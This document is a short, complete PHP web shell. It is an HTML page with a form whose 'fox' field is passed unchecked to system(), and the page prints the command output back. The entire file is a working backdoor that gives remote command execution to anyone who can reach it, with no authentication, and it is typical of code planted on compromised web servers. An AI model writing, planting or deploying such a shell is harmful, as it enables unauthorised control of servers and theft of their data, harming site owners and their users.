<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="fox" autofocus id="fox" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['fox']))
    {
        system($_GET['fox'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
